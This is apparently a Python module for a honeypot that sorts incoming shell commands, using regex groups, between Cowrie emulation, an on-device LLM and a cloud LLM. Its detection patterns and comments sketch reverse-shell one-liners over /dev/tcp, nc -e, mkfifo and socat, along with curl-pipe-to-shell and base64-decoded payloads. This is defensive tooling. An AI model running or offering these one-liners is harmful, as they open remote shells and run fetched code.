import re

# ─── Group 1: Cowrie ─────────────────────────────────────────────────────────
# Handles: basic commands, file ops, package install, sudo, download

BASIC_PATTERNS = [
    # File Operations
    r'^(cat|cp|mv|rm|touch|head|tail|less|more|sort|diff|wc|ln|find|locate|file|stat|readlink|basename|dirname|truncate|tee|xargs|dd)(\s|$)',
    # Directory Operations
    r'^(cd|pwd|mkdir|rmdir|du|tree|ls|dir|vdir)(\s|$)',
    # File Permissions
    r'^(chmod|chown|chgrp|umask|getfacl|setfacl)(\s|$)',
    # User Information
    r'^(whoami|id|who|users|finger|w|last|lastlog|groups)(\s|$)',
    # Process Information
    r'^(ps|top|htop|kill|bg|fg|uptime|jobs|nice|renice|pgrep|pkill|killall|pstree|lsof)(\s|$)',
    # System Information
    r'^(uname|free|dmesg|arch|date|cal|df|lscpu|lsmem|lsblk|lshw|lspci|lsusb|hostname|hostnamectl|timedatectl)(\s|$)',
    # Text Processing
    r'^(grep|awk|sed|cut|tr|echo|sort|uniq|tac|rev|strings|xxd|hexdump|od|column|paste|join|nl)(\s|$)',
    # Compression
    r'^(tar|zip|unzip|gzip|gunzip|bzip2|bunzip2|xz|7z|zcat|zless)(\s|$)',
    # Shell Built-ins
    # Note: eval and exec appear here but _is_cloud() runs first in classify(),
    # so eval/exec with execution semantics still routes to cloud correctly.
    r'^(env|alias|exit|history|printenv|source|eval|exec|type|which|whereis|whatis|man)(\s|$)',
    r'^export(?!\s+PATH=)\s+',
    # User/Group Management
    r'^(adduser|useradd|userdel|usermod|groupadd|groupdel|groupmod|passwd|chpasswd|newgrp)(\s|$)',
    # Network Tools — download/scan
    r'^(nmap|masscan|wget|curl|ping|traceroute|arp|dig|nslookup|host|ftp|sftp|scp|whois)(\s|$)',
    r'^nc\s+',
    r'^(netstat|ss|ip|ifconfig)(\s|$)',
    r'^ssh\s+',
    r'^telnet\s+',
    # Package Management
    r'^(apt|apt-get|yum|dnf|pip|pip3|gem|npm|dpkg)\s+',
    # sudo anything
    r'^sudo\s+',
    # Specific patterns
    r'cat\s+/etc/(passwd|shadow|hosts|hostname|os-release|crontab|sudoers|group|fstab|issue|motd)',
    r'ls\s+(-\w+\s+)?(\/etc|\/var|\/tmp|\/root|\/home|\/proc|\/sys)',
    r'uname\s+-\w+',
    r'find\s+.*-(name|perm|user|exec)',
    r'ps\s+(-\w+|aux|ef)',
]

# ─── Group 2: On-Device LLM ──────────────────────────────────────────────────
# Handles: script execution, version queries, service status, context-dependent

ONDEVICE_PATTERNS = [
    # Service Management
    r'^(systemctl|service)\s+',
    # Job Scheduling
    r'^(crontab|cron|atd)(\s|$)',
    # User/Group Management
    r'^(chage|chfn|chsh)(\s|$)',
    # Kernel & Modules
    r'^(lsmod|insmod|rmmod|modinfo)(\s|$)',
    # Logging
    r'^(journalctl|sar)(\s|$)',
    # Development Tools
    r'^(gcc|g\+\+|gdb|make)(\s|$)',
    # Script execution (running a file, not an inline payload)
    r'^(python|python3|perl|ruby|php|node|lua)\s+',
    r'^\./\w+',
    r'^(bash|sh)\s+\S+',
    # Environment
    r'^export\s+PATH=',
    r'^unset\s+\w+',
    # Session
    r'^(screen|stty|tty)(\s|$)',
]

# ─── Group 3: Cloud LLM ──────────────────────────────────────────────────────
# Routes commands requiring SEMANTIC RECONSTRUCTION OF EXECUTION INTENT —
# the real action cannot be determined without decoding, evaluating, or
# reconstructing the payload from its indirect or encoded form.
#
# Design principle: cloud routing is about SEMANTIC RECONSTRUCTION, not impact.
#   eval $(echo whoami)                      → FI 0, CLOUD     (intent hidden)
#   python3 -c "import os; os.system('id')" → FI 0, CLOUD     (intent hidden)
#   python3 -c "print(123)"                 → FI 0, ON-DEVICE  (intent explicit)
#   rm -rf /                                → FI 4, NOT CLOUD  (intent explicit)
#
# Rules are grouped by the shell mechanism that obscures semantic intent.
# No entropy thresholds or operator counts are used — every rule is anchored
# to a concrete, nameable shell behaviour citable in a research paper.

# ── Helpers ───────────────────────────────────────────────────────────────────

# Execution-intent keywords: presence inside an interpreter payload indicates
# the one-liner is attempting to run system commands, not just compute.
_EXEC_INTENT = (
    r'os\.system\s*\('
    r'|os\.execute\s*\('              # Lua: os.execute("/bin/sh")
    r'|subprocess\.'
    r'|pty\.spawn\s*\('
    r'|\bpopen\s*\('
    r'|\bsystem\s*\('
    r'|\bexecl?\s*\('
    r'|\bexecvp?\s*\('
    r'|\bspawn\s*\('
    r'|socket\.socket\s*\('           # reverse shell scaffolding
    r'|connect\s*\(\s*\('             # socket.connect((...))
    r"|dup2\s*\("                     # fd redirect in rev-shell
    r'|TCPSocket\b'                   # Ruby reverse shell
    r'|Net::Socket\b'                 # Perl reverse shell
    r'|use\s+Socket\b'                # Perl socket import
    r'|require\s*\(\s*["\']child_process["\']'  # Node.js exec
    r'|\bexec\s*\(["\']'              # exec("cmd") inside interpreter
    r'|\bexec\s+["\'/]'               # exec "/bin/sh" bare form (Ruby/Perl)
    r'|\beval\s*\('                   # eval() inside interpreter payload
)

# Network-fetch prefixes: when these appear before a pipe, the pipe-to-interpreter
# is loading a remote payload — not processing a local file.
_NET_FETCH = r'(curl|wget|busybox\s+wget|fetch|lwp-download)\b'

# ── Category A: Indirect execution ───────────────────────────────────────────
# The outer shell delegates execution to a subshell or interpreter whose
# argument string hides the real command. A reasoner must evaluate the
# argument to reconstruct intent.
#
# Refinements:
#   eval:        kept unconditional — any eval requires semantic reconstruction
#   exec:        restricted to network FD redirection; plain `exec ls` is transparent
#   bash/sh -c:  only escalate when the argument contains a subshell, encoding,
#                or decoding operation — `bash -c 'ls'` is explicit and handled
#                by Cowrie/on-device

_INDIRECT = [
    # eval always hides intent — the argument must be evaluated before intent is known
    r'\beval\b',

    # exec opening a network file descriptor — `exec 5<>/dev/tcp/...`
    # NOT triggered by `exec ls` or `exec bash`
    r'\bexec\s+\d+[<>]',

    # bash -c / sh -c only when the argument contains subshell substitution,
    # backticks, or a decoding pipeline — these hide what -c actually runs
    r'(?:bash|sh)\s+-c\b.*\$\(',
    r'(?:bash|sh)\s+-c\b.*`[^`]+`',
    r'(?:bash|sh)\s+-c\b.*base64\s+-d',
    r'(?:bash|sh)\s+-c\b.*base64\s+--decode',
    r'(?:bash|sh)\s+-c\b.*xxd\s+-r',
    r'(?:bash|sh)\s+-c\b.*openssl\b.*-d\b',
]

# ── Category B: Encoding / decoding ──────────────────────────────────────────
# The payload is in an encoded form opaque to static reading.
# Decoding is required before content — and therefore intent — is known.

_DECODING = [
    r'base64\s+-d',                      # echo <b64> | base64 -d | ...
    r'base64\s+--decode',                # GNU long form
    r'openssl\s+enc\b.*-d\b',           # openssl enc -d -aes-256-cbc ...
    r'openssl\s+base64\s+-d',           # openssl base64 -d
    r'xxd\s+-r',                         # xxd -r -p  (hex → binary)
    r'(\\x[0-9a-fA-F]{2}){3,}',         # \x63\x61\x74 hex escape runs
    r"printf\s+['\"]?(\\\\x[0-9a-fA-F]{2}){3,}",  # printf '\x63\x61\x74'
]

# ── Category C: Dynamic shell evaluation ─────────────────────────────────────
# The command to execute is constructed at runtime. The outer shell cannot
# know what will run until it evaluates the inner expression.
#
# Refinement: $(...) and backticks are only escalated when:
#   (a) the substitution result IS the command (bare subshell)
#   (b) the substitution feeds into execution via a pipe
#   (c) the subshell contains execution-intent keywords
#   Simple argument substitutions (`ls $(pwd)`) are NOT escalated.

_DYNAMIC = [
    # Bare subshell as the entire command
    r'^\s*\$\([^)]+\)\s*$',
    r'^\s*`[^`]+`\s*$',

    # Subshell result piped into execution
    r'\$\([^)]+\)\s*\|',
    r'`[^`]+`\s*\|',

    # Subshell wrapping an interpreter one-liner with execution intent
    rf'\$\(.*(?:{_EXEC_INTENT}).*\)',
    rf'`.*(?:{_EXEC_INTENT}).*`',

    # Variable-splitting: $a$b trick to reconstruct a command name at runtime
    r'\$[a-zA-Z_]\w*\$[a-zA-Z_]\w*',
]

# ── Category D: Interpreter-mediated execution ───────────────────────────────
# An interpreter is invoked with an inline payload that contains
# execution-intent primitives. Intent is buried inside a string argument
# rather than expressed as a plain shell command — semantic reconstruction
# is required to determine what will run.
#
# Refinement: interpreter -c alone does NOT trigger cloud. The payload must
# also contain an execution-intent keyword so that:
#   python3 -c "print(123)"                  → ON-DEVICE (no exec intent)
#   python3 -c "import os; os.system('id')" → CLOUD     (exec intent present)
#
# Also added: find -exec sh, xargs sh, awk system(), rpm lua eval.

_INTERPRETER = [
    # Interpreter one-liners with execution intent in the payload
    rf'python3?\s+-c\b.*(?:{_EXEC_INTENT})',
    rf'perl\s+-e\b.*(?:{_EXEC_INTENT})',
    rf'ruby\s+-e\b.*(?:{_EXEC_INTENT})',
    rf'node\s+-e\b.*(?:{_EXEC_INTENT})',
    rf'php\s+-r\b.*(?:{_EXEC_INTENT})',
    rf'lua\s+-e\b.*(?:{_EXEC_INTENT})',

    # awk / tclsh with system() call
    r'\bawk\b.*\bsystem\s*\(',          # awk '{system("sh")}' or BEGIN{system(...)}
    r'\btclsh\b.*\beval\b',             # tclsh: eval exec id

    # find delegating execution to a shell
    r'\bfind\b.*-exec\s+(bash|sh)\b',   # find / -exec bash -c '...' \;
    r'\bfind\b.*-exec\s+\S*sh\b',       # find / -exec /bin/sh \;

    # xargs delegating to a shell
    r'\bxargs\b.*(bash|sh)\s+-c\b',     # xargs bash -c '...'
    r'\bxargs\b.*\b(bash|sh)\b\s*$',    # ... | xargs bash

    # rpm lua eval
    r'\brpm\b.*--eval\b.*\blua\b',
]

# ── Category E: Pipe-to-interpreter ──────────────────────────────────────────
# A payload is streamed into an interpreter. Only escalated when the SOURCE
# is a network fetch or a decoding operation — making the executed content
# invisible in the command. Local-file pipes (`cat file.py | python3`) are NOT
# escalated since the content is statically present on disk.

_PIPE_TO_INTERP = [
    # Network fetch piped into a shell or interpreter
    rf'{_NET_FETCH}[^|]*\|\s*(bash|sh|python3?|perl|ruby|php|node)\b',

    # Decoded payload piped into execution
    r'base64\s+(-d|--decode)[^|]*\|\s*(bash|sh|python3?|perl|ruby)\b',
    r'xxd\s+-r[^|]*\|\s*(bash|sh|python3?|perl|ruby)\b',
    r'openssl\b[^|]*-d\b[^|]*\|\s*(bash|sh|python3?|perl|ruby)\b',
]

# ── Category F: Reverse-shell primitives ─────────────────────────────────────
# These constructs open a raw bidirectional network channel back to an attacker.
# Cowrie and the on-device model cannot meaningfully emulate these.

_REVERSE_SHELL = [
    r'/dev/tcp/',                        # bash -i >& /dev/tcp/ip/port 0>&1
    r'/dev/udp/',                        # sh -i >& /dev/udp/ip/port 0>&1
    r'\bmkfifo\b',                       # mkfifo /tmp/f; cat /tmp/f | nc ...
    r'\bsocat\b',                        # socat exec:'bash -li',...
    r'\bnc\b.*-e\b',                    # nc -e /bin/sh ip port
    r'\bncat\b.*-e\b',                  # ncat -e /bin/bash ip port
]

# ── Combined check ────────────────────────────────────────────────────────────

def _is_cloud(cmd: str) -> bool:
    """
    Return True when the command requires cloud LLM reasoning because its
    real execution intent cannot be determined without semantic reconstruction
    — i.e. without decoding, evaluating, or re-assembling an indirect payload.

    All rules are anchored to a concrete, nameable shell mechanism.
    No entropy thresholds or operator-count heuristics are used.
    """
    all_rules = (
        _INDIRECT
        + _DECODING
        + _DYNAMIC
        + _INTERPRETER
        + _PIPE_TO_INTERP
        + _REVERSE_SHELL
    )
    return any(re.search(pattern, cmd) for pattern in all_rules)


# ─── Classifier ──────────────────────────────────────────────────────────────

def classify(cmd: str, session_history: list) -> str:
    cmd = cmd.strip()

    # Cloud first — requires semantic reconstruction of execution intent
    if _is_cloud(cmd):
        return 'cloud'

    # Cowrie — basic + install + sudo + download
    if _matches(cmd, BASIC_PATTERNS):
        return 'cowrie'

    # On-Device — script execution + service status + context-dependent
    if _matches(cmd, ONDEVICE_PATTERNS):
        return 'on_device'

    # Fallback
    return 'cowrie'

# ─── Helpers ─────────────────────────────────────────────────────────────────

def _matches(cmd: str, patterns: list) -> bool:
    return any(re.search(p, cmd) for p in patterns)


if __name__ == "__main__":
    test_cmds = ["hello", "hey", "hi", "wtf", "what"]
    all_pattern_groups = [
        ("BASIC", BASIC_PATTERNS),
        ("ONDEVICE", ONDEVICE_PATTERNS),
    ]
    for cmd in test_cmds:
        result = classify(cmd, [])
        print(f"\n{cmd!r} → {result}")
        for group_name, patterns in all_pattern_groups:
            for p in patterns:
                if re.search(p, cmd):
                    print(f"   matched {group_name}: {p}")